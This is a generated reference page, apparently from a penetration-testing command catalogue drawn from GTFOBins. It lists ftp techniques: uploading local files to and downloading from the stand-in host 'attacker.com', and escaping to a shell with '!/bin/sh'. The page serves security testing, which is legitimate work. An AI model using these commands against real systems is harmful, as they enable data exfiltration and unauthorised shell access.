---
parsed_by: focuslocust
source: commands
type: generated
---
# ftp Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## ftp

Tool page: [ftp](../../tools/linux/ftp.md)

### download

```text
ftp -a attacker.com
get /path/to/input-file output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ftp` |
| Evidence | Function example preserved from source parser. |

### shell

```text
ftp
!/bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ftp` |
| Evidence | Function example preserved from source parser. |

### upload

```text
ftp -a attacker.com
put /path/to/input-file output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ftp` |
| Evidence | Function example preserved from source parser. |
